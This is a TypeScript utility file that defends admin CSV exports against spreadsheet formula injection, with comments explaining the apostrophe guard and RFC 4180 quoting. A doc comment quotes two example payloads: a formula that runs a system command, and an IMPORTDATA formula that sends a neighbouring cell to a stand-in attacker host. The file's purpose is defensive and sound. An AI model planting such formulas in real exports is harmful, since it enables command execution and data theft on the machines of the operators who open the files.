/**
 * CSV field helpers shared by every admin export — orders (TASK-425) and
 * newsletter subscribers.
 *
 * They live here, in ONE place, because they did not: both exports grew their
 * own private `escapeCsv`, character-for-character identical, and the review of
 * TASK-425 found the same hole in both copies. Two identical helpers are two
 * places a security fix has to land, and the second one is the one that gets
 * missed.
 *
 * Imported by path (`../common/utils/csv.util`) rather than through the
 * `common/utils` barrel only because the barrel was owned by another agent in
 * the wave that added this file; move the export up whenever the barrel is next
 * touched.
 */

/**
 * A value a spreadsheet would execute instead of displaying (CSV injection,
 * CWE-1236).
 *
 * Excel, LibreOffice Calc and Google Sheets all treat a cell opening with `=`,
 * `+`, `-` or `@` as a FORMULA, and a formula in a downloaded file runs on the
 * operator's machine the moment they open it — `=cmd|'/c calc.exe'!A0`,
 * `=IMPORTDATA("https://attacker/"&A2)` exfiltrating the row beside it, and so
 * on. Every free-text column in our exports is shopper-supplied: `guestName`
 * and the address `city` pass through DTOs that impose a max length and a trim
 * and nothing else, so the attacker is simply a customer who typed a name.
 *
 * RFC-4180 quoting is NOT a mitigation, which is what made this easy to miss:
 * the spreadsheet strips the quotes while parsing and evaluates what is inside.
 * Neutralising means changing the VALUE, and the only safe change is to make it
 * unambiguously text.
 *
 * Leading whitespace is part of the test rather than ignored by it. TAB and CR
 * are on OWASP's trigger list precisely because a parser that trims them exposes
 * the `=` hiding behind — so `\t=1+1`, `\r=1+1` and `  =1+1` all have to be
 * caught, and testing only the very first character catches none of them.
 */
const SPREADSHEET_FORMULA = /^\s*[=+\-@]/;

/**
 * Escape one CSV field: neutralise a spreadsheet formula, then quote per
 * RFC 4180 (wrap in double quotes, doubling any embedded quote, whenever the
 * value carries a comma, a quote or a newline — a customer named
 * «Петренко, Олена» must not shift every later column by one).
 *
 * The formula guard prefixes an apostrophe, which every spreadsheet reads as
 * "the rest of this cell is literal text" and does not display. It runs FIRST so
 * the quoting rule below sees the final value.
 *
 * Consequence worth knowing before someone "fixes" it: a genuinely negative
 * number would export as `'-100.00`, i.e. as text. No column in either export
 * is ever negative today (money is stored non-negative and the sign lives in the
 * column name), and a number that Excel refuses to execute is the right trade in
 * any case. Do not carve out an exception without re-reading the trigger list —
 * `-1+1` is both a plausible number and a formula.
 */
export function escapeCsvField(value: string): string {
  const safe = SPREADSHEET_FORMULA.test(value) ? `'${value}` : value;

  if (/[",\r\n]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }

  return safe;
}

/**
 * Collapse every CR/LF run in a field into a single space, so one record is
 * guaranteed to occupy one PHYSICAL line of the file.
 *
 * RFC 4180 allows a quoted field to span lines, and `escapeCsvField` quotes such
 * a value correctly — but the order export's consumer (the admin table's
 * download toast) counts the exported rows by splitting the text on `\r\n` and
 * compares that against the total it already holds, to tell the operator when
 * the server's row cap truncated their file. A single multi-line free-text
 * field inflates that count, the count reaches the total, the truncation warning
 * is skipped, and the operator gets a green "done" toast for a spreadsheet
 * silently missing every order past the cap.
 *
 * So the invariant the count relies on is enforced here rather than assumed
 * there. Lossy by design: a newline inside a customer's name or city carries no
 * meaning worth a silently wrong export.
 */
export function toSingleCsvLine(value: string): string {
  return value.replace(/[\r\n]+/g, ' ');
}
